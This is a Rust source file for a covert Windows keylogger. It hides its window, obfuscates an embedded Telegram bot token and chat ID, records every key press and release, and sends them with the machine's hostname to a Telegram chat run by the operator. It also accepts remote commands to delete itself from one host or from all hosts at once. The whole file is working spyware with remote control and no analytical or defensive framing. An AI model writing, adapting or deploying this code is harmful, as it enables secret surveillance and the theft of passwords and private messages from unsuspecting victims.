#![windows_subsystem = "windows"]

use std::time::Duration;
use gethostname::gethostname;
use rdev::{EventType, listen};
use teloxide::{prelude::*, utils::command::BotCommands};
use tokio::sync::mpsc;

use obfstr::obfstr as s;

#[derive(BotCommands, Clone)]
#[command(rename_rule = "lowercase", description = "These commands are supported:")]
enum Command {
    #[command(description = "remove the executable from the system with the given hostname")]
    Remove(String),
    #[command(description = "nuke all the executables running")]
    Nuke,
    #[command(description = "show this text")]
    Help
}

async fn answer(bot: Bot, msg: Message, cmd: Command) -> ResponseResult<()> {
    if msg.chat.id.to_string() != s!(env!("CHAT_ID")) {
        bot.send_message(msg.chat.id, "You are not authorized to use this bot").await?;
    }

    match cmd {
        Command::Remove(hostname) => {
            if hostname == gethostname().to_string_lossy() {
                bot.send_message(msg.chat.id, "Removing executable from system").await?;
                std::fs::remove_file(std::env::current_exe().unwrap()).unwrap();
                std::process::exit(0);
            }
        }
        Command::Nuke => {
            bot.send_message(msg.chat.id, format!("Nuking {}", gethostname().to_string_lossy())).await?;
            std::fs::remove_file(std::env::current_exe().unwrap()).unwrap();
            std::process::exit(0);
        },
        Command::Help => {
            bot.send_message(msg.chat.id, Command::descriptions().to_string()).await?;
        }
    }
    Ok(())
}

#[tokio::main]
async fn main() {
    let bot = Bot::new(s!(env!("BOT_TOKEN")));

    let command_task = Command::repl(bot.clone(), answer);

    let (tx, mut rx) = mpsc::unbounded_channel::<String>();

    let bot_task = tokio::spawn(async move {
        while let Some(message) = rx.recv().await {
            loop {
                match bot.send_message(s!(env!("CHAT_ID")).to_string(), message.clone()).await {
                    Ok(_)   => break,
                    Err(err) => {
                        eprintln!("Failed to send message with error: {:?}", err);
                        tokio::time::sleep(Duration::from_secs(5)).await; // Retry after 5 seconds if failed
                    }
                }
            }
        }
    });

    let task = {
        tokio::task::spawn_blocking(move || {
            listen(move |event| {
                let tx = tx.clone();
                tokio::spawn(async move {
                    match event.event_type {
                        EventType::KeyPress(key) => {
                            tx.send(format!("{} | Pressed {:?}", gethostname().to_string_lossy(), key)).expect("Failed to add message to buffer");
                        }
                        EventType::KeyRelease(key) => {
                            tx.send(format!("{} | Released {:?}", gethostname().to_string_lossy(), key)).expect("Failed to add message to buffer")
                        }
                        _ => {}
                    };
                });
            }).expect("Failed while listening to keyboard events");
        })
    };

    tokio::select! {
        _ = bot_task => {}
        _ = task => {}
        _ = command_task => {}
    }
}
